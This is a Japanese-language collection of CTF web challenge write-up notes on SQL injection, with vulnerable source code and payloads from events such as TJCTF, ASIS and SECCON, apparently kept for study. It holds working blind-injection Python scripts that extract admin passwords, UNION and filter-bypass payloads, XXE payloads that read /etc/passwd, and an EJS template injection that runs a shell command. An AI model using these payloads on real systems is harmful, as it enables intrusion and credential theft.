<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [writeup](#writeup)
  - [blind / identify admin's password (TJCTF 2020  Weak Password)](#blind--identify-admins-password-tjctf-2020--weak-password)
  - [login bypass (TJCTF 2020 Login Sequel)](#login-bypass-tjctf-2020-login-sequel)
  - [union query / Stored SQL Injection (HackPack CTF 2020 Online Birthday Party)](#union-query--stored-sql-injection-hackpack-ctf-2020-online-birthday-party)
  - [login bypass / pass=''=0 / PHP Type Juggling (Houseplant CTF 2020 I don’t like needles)](#login-bypass--pass0--php-type-juggling-houseplant-ctf-2020-i-dont-like-needles)
  - [Union query / XXE (ASIS CTF Quals 2020 Treasury &#035;1 #2)](#union-query--xxe-asis-ctf-quals-2020-treasury-1-2)
  - [Prototype pollution / Quine SQL Injection / Template Injection (AsisCTF2020 admin-panel)](#prototype-pollution--quine-sql-injection--template-injection-asisctf2020-admin-panel)
  - [bypass filtering space 'or' '|' ',' / 検索フォーム　(SECCON CTF 2019 予選 web_search)](#bypass-filtering-space-or----%E6%A4%9C%E7%B4%A2%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%80%80seccon-ctf-2019-%E4%BA%88%E9%81%B8-web_search)
  - [inject in limit (SECCON beginners CTF 2020 Tweetstore)](#inject-in-limit-seccon-beginners-ctf-2020-tweetstore)
  - [blind injection / binary search (CryptixCTF'19 Writeup - Pure Magic)](#blind-injection--binary-search-cryptixctf19-writeup---pure-magic)
  - [filter union / blind injection / 検索フォーム (Pragyan CTF Animal attack)](#filter-union--blind-injection--%E6%A4%9C%E7%B4%A2%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0-pragyan-ctf-animal-attack)
  - [Union query / login (Securinets Prequals CTF 2019 – SQL Injected)](#union-query--login-securinets-prequals-ctf-2019--sql-injected)
  - [Union query / DB empty / login  (EasyCTF 2017  Sql Injection 2)](#union-query--db-empty--login--easyctf-2017--sql-injection-2)
  - [Union query / 検索フォーム (SECCON Beginners CTF 2019 Ramen)](#union-query--%E6%A4%9C%E7%B4%A2%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0-seccon-beginners-ctf-2019-ramen)
  - [Union query / login (DEFCON 21 CTF babysfirst)](#union-query--login-defcon-21-ctf-babysfirst)
- [](#)
- [](#-1)
- [常設の練習](#%E5%B8%B8%E8%A8%AD%E3%81%AE%E7%B7%B4%E7%BF%92)
  - [picoCTF 2019](#picoctf-2019)
    - [login bypass (Irish-Name-Repo 1)](#login-bypass-irish-name-repo-1)
    - [login bypass (Irish-Name-Repo 2)](#login-bypass-irish-name-repo-2)
    - [login bypass (Irish-Name-Repo 3)](#login-bypass-irish-name-repo-3)
    - [SQLite / Union query (Empire1)](#sqlite--union-query-empire1)
  - [ksnctf](#ksnctf)
    - [blind Injection / SQLite3 (Login 6)](#blind-injection--sqlite3-login-6)
  - [wargame.kr](#wargamekr)
    - [inject into order by / blind Injection (dbms335)](#inject-into-order-by--blind-injection-dbms335)
  - [hacker101 CTF](#hacker101-ctf)
    - [Photo Gallery](#photo-gallery)
      - [flag0 (Union query)](#flag0-union-query)
    - [flag1 (blind Injection)](#flag1-blind-injection)
    - [flag2 (Stack query / OS Command Injection)](#flag2-stack-query--os-command-injection)
- [メモ](#%E3%83%A1%E3%83%A2)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# writeup
## blind / identify admin's password (TJCTF 2020  Weak Password)
http://itsvipul.com/writeups/TJCTF_2020/Weak_Password.html  
- **entrypoint**  
ログインページがあって、`' or 1=1--`でログインできるが特にそのあとにFlagとかはない。`admin`のパスワードを特定すればFlagが出るって問題文に書いてある。  
pythonで以下のようなソースとなっている。  
```python
<!-- The following code might be helpful to look at: -->

<!--
def get_user(username, password):
    database = connect_database()
    cursor = database.cursor()
    try:
        cursor.execute('SELECT username, password FROM `userandpassword` WHERE username=\'%s\' AND password=\'%s\'' % (username, password))
    except:
        return render_template("failure.html")
    row = cursor.fetchone()
    database.commit()
    database.close()
    if row is None: return None
    return (row[0],row[1])
-->
```
`(Select unicode(substr(password,1,1)) from userandpassword limit 1 offset 0) > 50`みたいなbinary searchのBlindで特定する。  
- **payload**  
```python
#! /usr/bin/python3
import requests
import string

def inject(cmd):
    url = "https://weak_password.tjctf.org/login"
    data = {"username":"admin' AND {} -- ".format(cmd),"password":"leetcode"}
    #print(data)
    r = requests.post(url,data=data)
    #print(r.text)
    valid = "Congratulations"
    if(valid in r.text):
        return True
    else:
        return False


col_1 = "username"
col_2 = "password"
db = "userandpassword"

user = "admin"

#cmd = "Select unicode(substr(password,1,1)) from {} limit 1 offset 0 > 0 ".format(db)
flag=""
for i in range(1,10):
    l = 97 
    r = 123
    # l = 0
    # r = 100
    prev_mid = -1
    mid = int((l+r)/2)
    while(prev_mid!=mid):
        cmd = "(Select unicode(substr(password,{},{})) from userandpassword limit 1 offset 0) > {}".format(i,i,mid)
        #cmd = "(Select length(password) from userandpassword limit 1 offset 1) > {}".format(mid)
        val = inject(cmd)
        if(val):
            l = mid
        else:
            r=mid
        prev_mid=mid
        mid = int((l+r)/2)

    flag+=chr(mid+1)
    print(flag)
```
## login bypass (TJCTF 2020 Login Sequel)
https://github.com/CsEnox/TJCTFWriteups/blob/master/SequelLogin.md  
- **entrypoint**  
loginページがあるらしい。  
- **payload**  
`admin'/*`でログインするとフラグが出たらしい。  
## union query / Stored SQL Injection (HackPack CTF 2020 Online Birthday Party)
https://www.hamayanhamayan.com/entry/2020/04/30/104927  
- **entrypoint**  
同じ誕生日のユーザーを検索してくれるサイトらしい。  
`/index.php` トップページ  
`/account.php` ログイン、新規登録ができる  
`/profile.php` ログイン後に出るページ  
新規登録するときに入力する誕生日を使ってSQLを実行しているはずなのでここにSQLInjectionできるか試す。  
`'`を入力するとErrorを返してくれるのでSQLInjection可能とわかる。  
`a'#`で成功したのでMySQL。  
`a' UNION SELECT DISTINCT TABLE_NAME, null from INFORMATION_SCHEMA.COLUMNS #`でテーブル一覧を取得できる。  
```txt
CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_LOCKS,INNODB_TRX,INNODB_SYS_DATAFILES,INNODB_FT_CONFIG,INNODB_SYS_VIRTUAL,INNODB_CMP,INNODB_FT_BEING_DELETED,INNODB_CMP_RESET,INNODB_CMP_PER_INDEX,INNODB_CMPMEM_RESET,INNODB_FT_DELETED,INNODB_BUFFER_PAGE_LRU,INNODB_LOCK_WAITS,INNODB_TEMP_TABLE_INFO,INNODB_SYS_INDEXES,INNODB_SYS_TABLES,INNODB_SYS_FIELDS,INNODB_CMP_PER_INDEX_RESET,INNODB_BUFFER_PAGE,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_INDEX_TABLE,INNODB_FT_INDEX_CACHE,INNODB_SYS_TABLESPACES,INNODB_METRICS,INNODB_SYS_FOREIGN_COLS,INNODB_CMPMEM,INNODB_BUFFER_POOL_STATS,INNODB_SYS_COLUMNS,INNODB_SYS_FOREIGN,INNODB_SYS_TABLESTATS,users
```
usersテーブルを調べることにして、`a' UNION SELECT COLUMN_NAME, null FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' #`でカラム一覧を取得する。  
```txt
id,username,password,bday
```
`a' UNION SELECT password, bday FROM users #`でFlagが得られたらしい。  
- **payload**  
`a' UNION SELECT password, bday FROM users #`
## login bypass / pass=''=0 / PHP Type Juggling (Houseplant CTF 2020 I don’t like needles)
https://sec.hamayanhamayan.com/2020/04/27/houseplant-ctf-2020-web-writeups/#i-dont-like-needles  
- **entrypoint**  
`?sauce`というワードがHTMLに書かれていて、これにアクセスするとソースコードが得られるらしい。  
`mysqli_query($connection, "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'", MYSQLI_STORE_RESULT);`にSQLInjectionできそう。  
`if (mysqli_fetch_array($result, MYSQLI_ASSOC)["username"] == "flagman69") `で`mysqli_fetch_array`で連想配列にSQL結果を整形して、usernameが`flagman69`と一致しているかどうかチェックしている。  
`==`で比較しているのでType Jugglingの脆弱性もありそう。  
`strpos()`によってpassword欄には`1`という文字は使えない。  
```php
<?php

    if ($_SERVER['REQUEST_METHOD'] == "POST") {

        require("config.php");

        if (isset($_POST["username"]) && isset($_POST["password"])) {

            $username = $_POST["username"];
            $password = $_POST["password"];

            if (strpos($password, "1") !== false) {
                echo "<p style='color: red;'>Auth fail :(</p>";
            } else {

                $connection = new mysqli($SQL_HOST, $SQL_USER, $SQL_PASS, $SQL_DB);
                $result = mysqli_query($connection, "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'", MYSQLI_STORE_RESULT);

                if ($result === false) {
                    echo "<p style='color: red;'>I don't know what you did but it wasn't good.</p>";
                } else {
                    if ($result->num_rows != 0) {
                        if (mysqli_fetch_array($result, MYSQLI_ASSOC)["username"] == "flagman69") {
                            echo "<p style='color: green;'>" . $FLAG . " :o</p>";
                        } else {
                            echo "<p style='color: green;'>Logged in :)</p>";
                        }
                    } else {
                        echo "<p style='color: red;'>Auth fail :(</p>";
                    }
                }

            }
        }
    }

?>
```
username:`flagman69`,password:`' OR 0 = 0#`でログインは成功するが、`0=0`のため全レコードが条件に一致し、すべてのレコードを取得するためusername:`flagman69`のレコードが先頭に来ない。  
`limit 1,1`や`offset 1`を使えない。  
username:`flagman69`,password:`'=0#`とすると、`username='flagman69' and password=''=0`となり、`password=''=0`はTrueとなってpasswordに正しい文字列を入力したことと同じになり、`flagman69`だけが返る。  
他にもusername:`flagman' #`でも可能！  
PHP Type Jugglingを使った`SELECT * FROM demo where name="testaa" union select 0,0,0`で`if(0 == "flagman69")`とさせて条件を突破させる方法もありそう。  
- **payload**  
username:`flagman69`,password:`'=0#`  
username:`flagman' #`  
`a' union select 0,0,0 #`  
## Union query / XXE (ASIS CTF Quals 2020 Treasury #1 #2)
https://github.com/saw-your-packet/ctfs/blob/master/ASIS%20CTF%20Quals%202020/Write-ups.md#treasury-1  
https://ctftime.org/writeup/24592  
https://ctftime.org/writeup/22126  
- **entrypoint**  
本の抜粋(excerpt)を読めるサイトがある。  
BurpのSpiderで`books.php?type=excerpt&id=1`をしている箇所があり、これが抜粋を読み込んでいる箇所だと推測。  
`id=4' or id='3`で3のコンテンツが返ったのでSQLInjection可能とわかる！(4は存在しない)  
`null' union select 'null`を入力すると`simplexml_load_string()`のerrorとなり、`null`をXMLとして解釈しようとしてエラーが発生しているとわかる。  
ここから、XXEの脆弱性もあることがわかる。  
本の抜粋のXMLデータであるはずなので以下のようになっていると推測するらしい？？  
これで`' UNION SELECT '<root><excerpt>TESTING HERE</excerpt></root>`とするとTESTING HEREが返ったのでXMLはこの構文でいいらしい。  
```xml
<root>
  <excerpt>TESTING HERE</excerpt>
</root>
```
  
以下で`/etc/passwd`が返るらしい。  
```txt
4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///etc/passwd">]><root><id>4</id><excerpt>&test;</excerpt></root>
```
以下で`index.php`が返る。`<`とかが入っているとXML構文エラーとなってしまうため、Base64エンコードする。  
```txt
4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=books.php">]><root><id>4</id><excerpt>&test;</excerpt></root>
```
以下で`ASISCTF`というデータベース名が返った。  
```txt
4' union select concat('<root><id>4</id><excerpt>',database(),'</excerpt></root>') where 'a'='a
```
以下でbooksテーブルのinfoカラムの値を表示できる。`REPLACE`で`<`が構文エラーしないように`?`に変更している。  
これで`#1`のフラグはゲットできるらしい。  
```txt
4' union select concat('<root><id>4</id><excerpt>',REPLACE((select group_concat(0x7c,info,0x7c) from books),'<','?'),'</excerpt></root>') where ''='
```
これで`#2`のフラグをゲットできるらしい。  
```txt
4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///flag">]><root><id>4</id><excerpt>&test;</excerpt></root>
```
PHPソースは以下のようだったらしい。  
```php
<?php
sleep(1);

function connect_to_database() {
  $link = mysqli_connect("web4-mariadb", "ctfuser", "dhY#OThsdivojq2", "ASISCTF");
  if (!$link) {
    echo "Error: Unable to connect to DB.";
    exit;
  }
  return $link;
}

function fetch_books($condition) {
  $link = connect_to_database();
  if ($condition === "") {
    $where_condition = "";
  } else {
    $where_condition = "WHERE $condition";
  }
  $query = "SELECT info FROM books $where_condition";
  if ($result = mysqli_query($link, $query, MYSQLI_USE_RESULT)) {
    $books_info = array();
    while($row = $result->fetch_array(MYSQLI_NUM)) {
      $books_info[] = (string) $row[0];
    }
    mysqli_free_result($result);
  }
  mysqli_close($link);
  return $books_info;
}

function xml2array($xml) {
  return array(
    'id' => (string) $xml->id,
    'name' => (string) $xml->name,
    'author' => (string) $xml->author,
    'year' => (string) $xml->year,
    'link' => (string) $xml->link
  );
}

function get_all_books() {
  $books = array();
  $books_info = fetch_books("");
  foreach ($books_info as $info) {
    $xml = simplexml_load_string($info, 'SimpleXMLElement', LIBXML_NOENT);
    $books[] = xml2array($xml);
  }
  return $books;
}

function find_book($condition) {
  $book_info = fetch_books($condition)[0];
  $xml = simplexml_load_string($book_info, 'SimpleXMLElement', LIBXML_NOENT);
  return $xml;
}

$type = @$_GET["type"];
if ($type === "list") {
  $books = get_all_books();
  echo json_encode($books);

} elseif ($type === "excerpt") {
  $id = @$_GET["id"];
  $book = find_book("id='$id'");
  $bookExcerpt = $book->excerpt;
  echo $bookExcerpt;

} else {
  echo "Invalid type";
}
```
- **payload**  
これで`#1`のフラグはゲットできるらしい。  
```txt
4' union select concat('<root><id>4</id><excerpt>',REPLACE((select group_concat(0x7c,info,0x7c) from books),'<','?'),'</excerpt></root>') where ''='
```
これで`#2`のフラグをゲットできるらしい。  
```txt
4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///flag">]><root><id>4</id><excerpt>&test;</excerpt></root>
```
## Prototype pollution / Quine SQL Injection / Template Injection (AsisCTF2020 admin-panel)
https://vuln.live/blog/10  
https://github.com/TeamGreyFang/CTF-Writeups/tree/master/AsisCTF2020/admin-panel  
- **entrypoint**  
app.js, router/main.js, package.jsonが配布されているらしい。  
flagは`app.locals.flag`にありそう。  
```js
// app.js
const express = require('express');
const app = express();
const session = require('express-session');
const db = require('better-sqlite3')('./db.db', {readonly: true});
const cookieParser = require("cookie-parser");
const FileStore = require('session-file-store')(session);
const fs = require('fs');

app.locals.flag = "REDACTED"
app.use(express.static('static'));
app.use(cookieParser());
app.use(express.urlencoded({extended: false}));
app.use(express.json());
app.set('views', __dirname + '/views');
app.set('view engine', 'ejs');
app.engine('html', require('ejs').renderFile);

const server = app.listen(3000, function(){
    console.log("Server started on port 3000")
});

app.use(session({
    secret: 'REDACTED',
    resave: false,
    saveUninitialized: true,
    store: new FileStore({path: __dirname+'/sessions/'})
}));

const router = require('./router/main')(app, db, fs);
```
SQLInjectionでadminになった後に、File uploadで`test.ejs`とかで中に`<%=flag%>`というテンプレートを作成すれば変数の中身を表示できる。  
```js
// router/main.js
module.exports = function(app, db, fs){
    app.get('/', function(req, res){
        res.render('index.html')
    });

    app.post('/login', function(req, res){
        var user = {};
        var tmp = req.body;
        var row;

        if(typeof tmp.pw !== "undefined"){
            tmp.pw = tmp.pw.replace(/\\/gi,'').replace(/\'/gi,'').replace(/-/gi,'').replace(/#/gi,'');
        }

        for(var key in tmp){
            user[key] = tmp[key];
        }

        if(req.connection.remoteAddress !== '::ffff:127.0.0.1' && tmp.id === 'admin' || typeof user.id === "undefined"){
            user.id = 'guest';
        }
        req.session.user = user.id;

        if(typeof user.pw !== "undefined"){
            row = db.prepare(`select pw from users where id='admin' and pw='${user.pw}'`).get();
            if(typeof row !== "undefined"){
                req.session.isAdmin = (row.pw === user.pw);
            }else{
                req.session.isAdmin = false;
            }
            if(req.session.isAdmin && req.session.user === 'admin'){
                res.statusCode = 302;
                res.setHeader('Location','admin');
                res.end();
            }else{
                res.end("Access Denied!");
            }
        }else{
            res.end("No password given.");
        }
    });

    app.get('/admin', function(req, res){
        if(typeof req.session.isAdmin !== "undefined" && req.session.isAdmin && req.session.user === 'admin'){
            if(typeof req.query.test !== "undefined"){
                res.render(req.query.test);
            }else{
                res.render("admin.html");
            }
        }else{
            res.end("Access Denied!");
        }
    });

    app.post('/upload', function(req, res){
        if(typeof req.session.isAdmin !== "undefined" && req.session.isAdmin && req.session.user === 'admin'){
            if(typeof req.body.name !== "undefined" && typeof req.body.file !== "undefined"){
                var fname = req.body.name;
                var dir = './views/upload/'+req.session.id;
                var contents = req.body.file;

                !fs.existsSync(dir) && fs.mkdirSync(dir);
                fs.writeFileSync(dir+'/'+fname, contents);
                res.end("Done.");
            }else{
                res.end("Something's wrong");
            }
        }else{
            res.end("Permission Denied!");
        }
    });
}
```
あとPrototype Pollutionにも脆弱らしい。  
以下のようにPOSTでリクエストして`tmp`に値を入れると、`tmp.__proto__`に``{"id":"admin", "pw": " '#~` "}``という値が入る。  
このとき、`tmp.__proto__`は`Object.prototype`と同じなので`Object.prototype.id`,`Object.prototype.pw`に値が入ることになる。  
つまり、`tmp.id`,`tmp.pw`には値は入らないので`if(typeof tmp.pw !== "undefined"){`のpwのフィルタリングをbypassできる。  
for文で`user[key]=tmp[key]`のように値を代入して行く場合、`user.id`とかは定義されていない(`user={}`で初期化されてるだけ)ので`user.__proto__.id`を調べに行く。ここで、`user.__proto__.id`は`Object.prototype.id`と同義なので`admin`とかの値が入る。  
`for(var key in tmp){`では`key`には`"__proto__"`一つだけが入るのでは？？と思ったけどどうやらそうではなく、`"pw"`,`"id"`が入るらしい…。`"__proto__"`の場合だけ特別なんかな？？？   
```txt
{
	"__proto__":{"id":"admin", "pw": " '#~` "}
}
```
さらにこのDBには値がないも入っていないため、`row.pw === user.pw`を突破できない。  
そのため、Quine SQL Injectionという、入力したSQL構文と丸切り同じSQL構文を検索結果として返す特殊なSQL Payloadを使うらしい。  
```txt
{
	"__proto__":{"pw":"' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--","id":"admin"}
}
```
これでadminになった後に、以下のようなFlagを表示させるEJSをUploadして実行する  
```txt
  <%- global.process.mainModule.require('child_process').execSync('cat app.js') %>
```
- **payload**  
```txt
{
	"__proto__":{"pw":"' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--","id":"admin"}
}
```
```txt
  <%- global.process.mainModule.require('child_process').execSync('cat app.js') %>
```
- **Prototype Pollutionの参考**  
https://qiita.com/koki-sato/items/7b78f9ec139230b95beb  
https://jovi0608.hatenablog.com/entry/2018/10/19/083725  
## bypass filtering space 'or' '|' ',' / 検索フォーム　(SECCON CTF 2019 予選 web_search)
https://kinako-mochimochi.hatenablog.com/entry/2019/10/20/203747  
https://st98.github.io/diary/posts/2019-10-20-seccon-online-ctf.html  
- **entrypoint**  
` `,`or`,`!`,`,`,`|`,`%`が使えないらしい。  
` `は`/**/`やタブ文字や改行、`or`は`oorr`(再帰的に削除していないから)、`,`は`join`で制限を回避！  
```txt
sqlite> select 1, 2, 3 union select * from (select 4) a join (select 5) b join (select 6) c;
1|2|3
4|5|6
```
`'oorr(1);#`を入力すれば、`' or 1;#`と同じことができるらしい。ただこれだと今回はダメで「flagテーブルにFlagがある」というメッセージがでる。  
`neko'union/**/select*from(select/**/1)a/**/join(select/**/column_name/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flag')b/**/join(select/**/3)c;#`で`piece`というカラム名を取得。  
`neko'union/**/select*from(select/**/1)a/**/join(select/**/piece/**/from/**/flag)b/**/join(select/**/3)c;#`でFlagが出る！  
- **payload**  
`neko'union/**/select*from(select/**/1)a/**/join(select/**/piece/**/from/**/flag)b/**/join(select/**/3)c;#`  
## inject in limit (SECCON beginners CTF 2020 Tweetstore)
https://lorse.hatenablog.com/entry/2020/05/24/172016  
- **entrypoint**  
配布されたGoLangのソースは以下の通り。  
DBにはpostgresを使っており、User名がFlagになっているとわかる。SQLを組み立てるあたりでSQLInjectionができうる。  
```go
package main

import (
    "context"
    "fmt"
    "log"
    "os"
    "strings"
    "time"
 
    "database/sql"
    "html/template"
    "net/http"

    "github.com/gorilla/handlers"
    "github.com/gorilla/mux"

    _"github.com/lib/pq"
)

var tmplPath = "./templates/"

var db *sql.DB

type Tweets struct {
    Url        string
    Text       string
    Tweeted_at time.Time
}

func handler_index(w http.ResponseWriter, r *http.Request) {

    tmpl, err := template.ParseFiles(tmplPath + "index.html")
    if err != nil {
        log.Fatal(err)
    }

    var sql = "select url, text, tweeted_at from tweets"

    search, ok := r.URL.Query()["search"]
    if ok {
        sql += " where text like '%" + strings.Replace(search[0], "'", "\\'", -1) + "%'"
    }

    sql += " order by tweeted_at desc"

    limit, ok := r.URL.Query()["limit"]
    if ok && (limit[0] != "") {
        sql += " limit " + strings.Split(limit[0], ";")[0]
    }

    var data []Tweets


    ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
    defer cancel()

    rows, err := db.QueryContext(ctx, sql)
    if err != nil{
        http.Error(w, http.StatusText(500), 500)
        return
    }

    for rows.Next() {
        var text string
        var url string
        var tweeted_at time.Time

        err := rows.Scan(&url, &text, &tweeted_at)
        if err != nil {
            http.Error(w, http.StatusText(500), 500)
            return
        }
        data = append(data, Tweets{url, text, tweeted_at})
    }

    tmpl.Execute(w, data)
}

func initialize() {
    var err error

    dbname := "ctf"
    dbuser := os.Getenv("FLAG")
    dbpass := "password"

    connInfo := fmt.Sprintf("port=%d host=%s user=%s password=%s dbname=%s sslmode=disable", 5432, "db", dbuser, dbpass, dbname)
    db, err = sql.Open("postgres", connInfo)
    if err != nil {
        log.Fatal(err)
    }
}

func main() {

    initialize()

    r := mux.NewRouter()
    r.HandleFunc("/", handler_index).Methods("GET")

    http.Handle("/", r)
    http.ListenAndServe(":8080", handlers.LoggingHandler(os.Stdout, http.DefaultServeMux))
}
```
`search`では`'`を`\'`にエスケープしているが、`limit`ではしていないため、limit句にInjectできる場合のSQLInjectionテクニックが使える。  
ちなみに、`search`に`\`を挿入しても`'%\%'`となるので今回は`'\'`でバイパスするやつとは違う。残念。  
```go
var sql = "select url, text, tweeted_at from tweets"

search, ok := r.URL.Query()["search"]
if ok {
    sql += " where text like '%" + strings.Replace(search[0], "'", "\\'", -1) + "%'"
}

sql += " order by tweeted_at desc"

limit, ok := r.URL.Query()["limit"]
if ok && (limit[0] != "") {
    sql += " limit " + strings.Split(limit[0], ";")[0]
}
```
`pg_user`テーブルのusernameの一文字目が`c`なら、`limit 1`、そうじゃないなら`limit 0`で何も返されない。(0行返すという意味)  
```txt
limit=(CASE WHEN (SELECT ascii(substr(usename, 0, 1)) FROM pg_user LIMIT 1) = 99 THEN 1 ELSE 0 END)
```
- **payload**  
`limit=(CASE WHEN (SELECT ascii(substr(usename, 0, 1)) FROM pg_user LIMIT 1) = 99 THEN 1 ELSE 0 END)`  
```python
import requests


def judge(html):
    return "1 of 200 tweets are displayed. enjoy" in html


url = "http://tweetstore.quals.beginners.seccon.jp"


def leak_usename():
    leak = ""
    for j in range(1, 1000):
        for i in range(126, 32, -1):
            buf = f"(CASE WHEN (SELECT ascii(substr(usename, {j}, 1)) FROM pg_user LIMIT 1 OFFSET 1) = {i} THEN 1 ELSE 0 END)"
            params = {"search": "a", "limit": buf}
            print(buf)
            res = requests.get(url, params=params)
            if judge(res.text):
                leak += chr(i)
                print(f"[+] now:{leak}")
                break
        if len(leak) != j:
            print(f"[*] {leak}")
            break

leak_usename()
```
## blind injection / binary search (CryptixCTF'19 Writeup - Pure Magic)
https://graneed.hatenablog.com/entry/2019/10/13/214515  
- **entrypoint**  
passphraseを入力するフォームで`' or 1=1#`を入力すると、`SELECT * FROM data where password='XXXXX'`を特定するというヒントが出る。  
以下の普通のbinary searchのBlind。 
- **payload**  
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import string
import time
URL = 'https://cryptixctf.com/web3/login.php'
target = ""
def trace_request(req):
    print("[+] request start")
    print('{}\n{}\n\n{}'.format(
        req.method + ' ' + req.url,
        '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))
    print("[+] request end")
def trace_response(res):
    print("[+] response start")
    print('{}\n{}\n\n{}'.format(
        res.status_code,
        '\n'.join('{}: {}'.format(k, v) for k, v in res.headers.items()),
        res.content,
    ))
    print("[+] response end")
def challenge(offset, guess):
    req = requests.Request(
        'POST',
        URL,
        data={
            "pwd" : "' or ASCII(SUBSTRING((select password from data limit 0, 1),{},1)) < {} #".format(offset + 1, guess)
        }
    )
    prepared = req.prepare()
    #trace_request(prepared)
    session = requests.Session()
    #start = time.time() # TimeBased用
    res = session.send(prepared, allow_redirects = False)
    #elapsed_time = time.time() - start # TimeBased用
    #trace_response(res)
    if "There is no flag" in res.content.decode("utf-8"):
        return True # 取得したい文字の文字コードは予想文字の文字コードより小さい
    else:
        return False # 取得したい文字の文字コードは予想文字の文字コード以上
def binarySearch(offset):
    low = 0
    high = 256
    while low <= high:
        guess = (low + high) // 2
        is_target_lessthan_guess = challenge(offset, guess)
        if is_target_lessthan_guess:
            high = guess
        else:
            low = guess
        if high == 1:
            return -1
        elif high - low == 1:
            return low
while True:
    code = binarySearch(len(target))
    if code == -1:
        break
    target += chr(code)
    print("[+] target: " + target)
print("[+] target: " + target)
```
## filter union / blind injection / 検索フォーム (Pragyan CTF Animal attack)
http://ctf.publog.jp/archives/1069963262.html  
http://kyuri.hatenablog.jp/entry/2018/03/06/182735  
- **entrypoint**  
`union`というキーワードが使えないらしい。普通のBlind。  
- **payload**  
```python
import requests
from bs4 import BeautifulSoup

def judge(html):
  html = BeautifulSoup(html,"lxml")
  agent = html.find_all("div",id="agent")
  if len(agent) == 0:
    return False
  return True

url = "http://128.199.224.175:24000/"

def leak_shema_name():
  flag = False
  for k in range(100):
    if flag:
      break
    schema = ""
    for j in range(1,100):
      for i in range(126,32,-1):
        buf = "alix' and ord(substr((select schema_name from information_schema.schemata limit "
        buf += str(k)
        buf += ",1),"
        buf += str(j)
        buf += ",1)) > "
        buf += str(i)
        buf += " #"
        param = {"spy_name":buf.encode('base64')}
        res = requests.post(url,param)
        if judge(res.text):
          schema += chr(i+1)
          print "[+] now:%s" % schema
          break
      if len(schema) != j:
        if len(schema) != 0:
          print "[*] schema name:%s" % schema
          break
        else:
          flag = True
          break

def leak_table_column_name():
  leak = ""
  for j in range(1,1000):
    for i in range(126,32,-1):
      buf = "alix' and ord(substr((select group_concat(table_name,':',column_name) from information_schema.columns  where table_schema LIKE 'spy_database' limit 0,1),"
      buf += str(j)
      buf += ",1)) > "
      buf += str(i)
      buf += " #"
      param = {"spy_name":buf.encode('base64')}
      res = requests.post(url,param)
      if judge(res.text):
        leak += chr(i+1)
        print "[+] now:%s" % leak
        break
    if len(leak) != j:
      print "[*] %s" % leak
      break

def leak_admins_password():
  leak = ""
  for j in range(1,1000):
    for i in range(126,32,-1):
      buf = "alix' and ord(substr((select password from users  where username LIKE 'admin' limit 0,1),"
      buf += str(j)
      buf += ",1)) > "
      buf += str(i)
      buf += " #"
      param = {"spy_name":buf.encode('base64')}
      res = requests.post(url,param)
      if judge(res.text):
        leak += chr(i+1)
        print "[+] now:%s" % leak
        break
    if len(leak) != j:
      print "[*] %s" % leak
      break

leak_schema_name()
# schema1:information_schema
# schema2:spy_database

leak_table_column_name()
# spies:id,spies:name,spies:age,spies:experience,spies:description,users:id,users:username,users:password,users:email

leak_admins_password()
# pctf{L31's|@Ll_h4il-1h3-c4T_Qu33n.?}
```
## Union query / login (Securinets Prequals CTF 2019 – SQL Injected)
https://ctftime.org/writeup/14117  
- **entrypoint**  
配布されるソースの中の以下が脆弱。  
PayloadをusernameとしてRegisterすればSQLInjectionできそう。  
```txt
$sql = "SELECT * FROM posts WHERE author = '". $_SESSION['username'] ."'";
```
`https://web5.ctfsecurinets.com/flags.php`にadminとしてログインすればフラグが得られる。  
`create_db.sql`では以下のようになっているため、データベース上の構成がわかる。  
`users`テーブルには`id`,`login`,`password`,`role`  
`posts`テーブルには`id`,`title`,`content`,`date`,`author`カラムで構成されている。  
```txt
create database webn;
create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);
create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100));
```
上記のSQLInjectionできるポイントで`title`,`content`カラムを表示させるところに`union select login,password from users`みたいな感じでユーザー名とパスワードを合わせれば表示されそう。  
`union select`では`posts`テーブルと同じカラム数を渡さないといけないので以下のようにNULLで調整。  
admin的なユーザーの名前もパスワードのカラム名もわからないが、roleが1となっているはずなので以下のようにする。  
```txt
